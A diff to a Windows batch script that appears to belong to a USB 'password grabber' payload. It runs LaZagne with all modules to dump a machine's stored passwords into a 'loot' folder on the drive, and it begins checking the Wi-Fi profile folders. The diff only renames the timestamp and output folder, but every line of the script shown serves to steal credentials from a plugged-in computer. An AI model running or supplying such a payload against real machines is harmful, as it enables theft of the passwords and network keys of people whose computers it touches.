@@ -5,12 +5,12 @@ setlocal
 cd /d %~dp0
 
 REM Time and Date
-set drec=%COMPUTERNAME%_%date%_%time%
+set drec=%COMPUTERNAME%_%date%_%TIME: =0%
 set dst=%~dp0\..\..\loot\USB_Exfiltration\%drec%
 mkdir %dst% >>nul
 
 REM This executes LaZagne in the current directory and outputs the password file to Loot
-%~dp0\laZagne.exe all -v > "%~dp0\..\..\loot\USB_Exfiltration\%drec%\passwords.txt"
+%~dp0\laZagne.exe all -v > "%~dp0\..\..\loot\PasswordGrabber\%drec%\passwords.txt"
 
 
 if Exist c:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\* (
